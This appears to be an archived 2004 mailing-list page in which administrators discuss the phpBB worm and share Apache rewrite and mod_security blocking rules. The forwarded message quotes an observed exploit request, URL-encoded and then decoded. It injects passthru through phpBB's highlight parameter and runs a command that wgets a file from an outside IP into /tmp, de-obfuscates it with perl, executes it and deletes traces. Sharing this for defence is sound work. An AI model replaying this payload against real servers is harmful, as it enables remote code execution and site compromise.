@@ -1,0 +1,167 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
+<html>
+<head>
+<link href="../list/browse.css" rel="stylesheet" type="text/css">
+<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="list.cgi%3Flist=fosug&amp;cmd=feed&amp;feedtype=rss2" />
+<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="list.cgi%3Flist=fosug&amp;cmd=feed&amp;feedtype=atom" />
+<title>fosug: Re: phpBB Worm</title>
+<meta NAME="robots" CONTENT="noindex">
+<meta NAME="robots" CONTENT="nofollow">
+<base href="">
+</head>
+<body class=msg-body>
+<div class=menubar>
+<a class="menu-lists" href="list.cgi.html">[Lists]</a>
+<a class="menu-config" href="list.cgi%3Flist=fosug&amp;cmd=configure.html">[Configure]</a>
+<a class="menu-first" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200410.html">[<<]</a>
+<a class="menu-prev" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200411.html">[<]</a>
+<a class="menu-bythread" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200412.html">[by Thread]</a>
+<a class="menu-bydate" href="list.cgi%3Flist=fosug&amp;cmd=monthbydate&amp;month=200412.html">[by Date]</a>
+<a class="menu-next" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200501.html">[>]</a>
+<a class="menu-last" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200607.html">[>>]</a>
+<a class="menu-months" href="list.cgi%3Flist=fosug&amp;cmd=months.html">[Months]</a>
+<a class="menu-search" href="list.cgi%3Flist=fosug&amp;cmd=search.html">[Search]</a>
+<a class="menu-subscribe" href="mailto:fosug-subscribe@fosug.org?subject=Just click SEND">[eSubscribe]</a>
+<a class="feed-link" href="list.cgi%3Flist=fosug&amp;cmd=feed">[Feed]</a>
+</div>
+<hr>
+<div class=msg-title><h1>fosug: Re: phpBB Worm</h1></div>
+<hr>
+<div class=msg><table class=msgmenu>
+
+<tr class=msgmenu-prevbydate>
+<td class=msgmenu-label>Previous by date:</td>
+<td class=msgmenu-value>22 Dec 2004 18:30:35 -0000 <a class="subject" href="list.cgi%3Flist=fosug&amp;cmd=showmsg&amp;msgnum=110.html">Re: hi guys :-)</a>, <a class="author" href="list.cgi%3Flist=fosug&amp;cmd=author&amp;authorid=nljiecpfpnkhmgfboeen.html">George Fragos</a></td>
+</tr>
+
+<tr class=msgmenu-nextbydate>
+<td class=msgmenu-label>Next by date:</td>
+<td class=msgmenu-value>22 Dec 2004 18:30:35 -0000 <a class="subject" href="list.cgi%3Flist=fosug&amp;cmd=showmsg&amp;msgnum=112.html">Re: phpBB Worm [Scanned]</a>, <a class="author" href="list.cgi%3Flist=fosug&amp;cmd=author&amp;authorid=dbfcabnmmpgfbdibogec.html">Michael Cederquist</a></td>
+</tr>
+
+<tr class=msgmenu-prevbythread>
+<td class=msgmenu-label>Previous in thread:</td>
+<td class=msgmenu-value></td>
+</tr>
+
+<tr class=msgmenu-nextbythread>
+<td class=msgmenu-label>Next in thread:</td>
+<td class=msgmenu-value></td>
+</tr>
+
+</table>
+<hr><b>Subject:</b>
+<a href="mailto:fosug@fosug.org?subject=Re: Re: phpBB Worm">Re: phpBB Worm</a>
+<br><b>From:</b>
+<a class="author" href="list.cgi%3Flist=fosug&amp;cmd=author&amp;authorid=jjaibmhcgncgkcebgmfd&amp;month=200412.html">Stevo ####@####.####</a>
+<br><b>Date:</b>
+22 Dec 2004 18:30:35 -0000
+<br><b>Message-Id:</b> &lt;b9bd1f4d04122210304f87edf8@mail.gmail.com&gt;
+<br>
+<hr><pre>This is interesting... I've been following this worm for a while.
+Notice what it decodes too? It's pretty interesting. They send a
+request to a vulnerable web server that downloads a program, and runs
+perl to execute the contents and own the box, then it defaces the
+page. Hehe... I checked the fosug server, it's running phpbb but the
+php  version is not vulnerable.
+
+Interesting stuff isn't it?
+
+cheers,
+
+Stevo
+
+---------- Forwarded message ----------
+From: Sebastian Wiesinger ####@####.####
+Date: Wed, 22 Dec 2004 12:22:15 +0100
+Subject: Re: phpBB Worm
+To: ####@####.####
+
+
+* Raymond Dijkxhoorn ####@####.#### [2004-12-22 00:06]:
+&gt; If you cannot fix it (virtual servers) fast for all your clients you could
+&gt; also try with something like this:
+&gt;
+&gt;         RewriteEngine On
+&gt;         RewriteCond %{QUERY_STRING} ^(.*)echr(.*) [OR]
+&gt;         RewriteCond %{QUERY_STRING} ^(.*)esystem(.*)
+&gt;         RewriteRule ^.*$                                -               [F]
+&gt;
+&gt; We had some vhosts where this worked just fine. On our systems we didnt
+&gt; see any valid request with echr and esystem, just be gentle with it, it
+&gt; works for me, it could work for you ;)
+
+If you use mod_security, this may help, too:
+
+SecFilterSelective &quot;THE_REQUEST&quot;
+&quot;(system|exec|passthru|popen|shell_exec|proc_open|fopen|fwrite)\s*\(&quot;
+
+I had another exploit attempt, with this payload:
+
+66.119.13.4 - - [22/Dec/2004:10:06:47 +0100] &quot;GET
+/forum/viewtopic.php?t=%37&amp;rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20%63%64%20%2F%74%6D%70%3B%77%67%65%74%20%31%32%38%2E%31%37%34%2E%31%33%37%2E%32%33%30%2F%62%6E%20%2D%4F%20%2E%62%3B%20%70%65%72%6C%20%2D%70%65%20%79%2F%74%68%6D%76%64%77%30%39%38%37%36%35%34%33%32%31%75%6F%69%65%61%2F%61%65%69%6F%75%31%32%33%34%35%36%37%38%39%30%77%64%76%74%68%6D%2F%20%2E%62%7C%20%70%65%72%6C%3B%20%72%6D%20%2D%66%20%2E%62%20%2A%2E%70%6C%20%62%30%74%2A%3B%20%65%63%68%6F%20%5F%45%4E%44%5F&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527
+HTTP/1.1&quot; 200 12266 &quot;-&quot; &quot;-&quot;
+
+Which decodes to:
+
+rush=echo _START_; cd /tmp;wget 128.174.137.230/bn -O .b; perl -pe
+y/thmvdw0987654321uoiea/aeiou1234567890wdvthm/ .b| perl; rm -f .b *.pl
+b0t*; echo _END_
+highlight='.passthru($HTTP_GET_VARS[rush]).'
+
+Regards,
+
+Sebastian
+
+--
+GPG Key-ID: 0x76B79F20 (0x1B6034F476B79F20)
+Wehret den Anfaengen: <a href="http://odem.org/informationsfreiheit/">http://odem.org/informationsfreiheit/</a>
+Thunder rolled. ... It rolled a six.
+  --Terry Pratchett, Guards! Guards!
+</pre>
+
+<hr><table class=msgmenu>
+
+<tr class=msgmenu-prevbydate>
+<td class=msgmenu-label>Previous by date:</td>
+<td class=msgmenu-value>22 Dec 2004 18:30:35 -0000 <a class="subject" href="list.cgi%3Flist=fosug&amp;cmd=showmsg&amp;msgnum=110.html">Re: hi guys :-)</a>, <a class="author" href="list.cgi%3Flist=fosug&amp;cmd=author&amp;authorid=nljiecpfpnkhmgfboeen.html">George Fragos</a></td>
+</tr>
+
+<tr class=msgmenu-nextbydate>
+<td class=msgmenu-label>Next by date:</td>
+<td class=msgmenu-value>22 Dec 2004 18:30:35 -0000 <a class="subject" href="list.cgi%3Flist=fosug&amp;cmd=showmsg&amp;msgnum=112.html">Re: phpBB Worm [Scanned]</a>, <a class="author" href="list.cgi%3Flist=fosug&amp;cmd=author&amp;authorid=dbfcabnmmpgfbdibogec.html">Michael Cederquist</a></td>
+</tr>
+
+<tr class=msgmenu-prevbythread>
+<td class=msgmenu-label>Previous in thread:</td>
+<td class=msgmenu-value></td>
+</tr>
+
+<tr class=msgmenu-nextbythread>
+<td class=msgmenu-label>Next in thread:</td>
+<td class=msgmenu-value></td>
+</tr>
+
+</table>
+</div><hr><div class=menubar>
+<a class="menu-lists" href="list.cgi.html">[Lists]</a>
+<a class="menu-config" href="list.cgi%3Flist=fosug&amp;cmd=configure.html">[Configure]</a>
+<a class="menu-first" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200410.html">[<<]</a>
+<a class="menu-prev" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200411.html">[<]</a>
+<a class="menu-bythread" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200412.html">[by Thread]</a>
+<a class="menu-bydate" href="list.cgi%3Flist=fosug&amp;cmd=monthbydate&amp;month=200412.html">[by Date]</a>
+<a class="menu-next" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200501.html">[>]</a>
+<a class="menu-last" href="list.cgi%3Flist=fosug&amp;cmd=monthbythread&amp;month=200607.html">[>>]</a>
+<a class="menu-months" href="list.cgi%3Flist=fosug&amp;cmd=months.html">[Months]</a>
+<a class="menu-search" href="list.cgi%3Flist=fosug&amp;cmd=search.html">[Search]</a>
+<a class="menu-subscribe" href="mailto:fosug-subscribe@fosug.org?subject=Just click SEND">[eSubscribe]</a>
+<a class="feed-link" href="list.cgi%3Flist=fosug&amp;cmd=feed">[Feed]</a>
+</div>
+
+<hr>
+<div class=versioninfo>
+Powered by
+<a href="http://untroubled.org/ezmlm-browse/">ezmlm-browse 0.10</a>.
+</div>
+</body>
+</html>
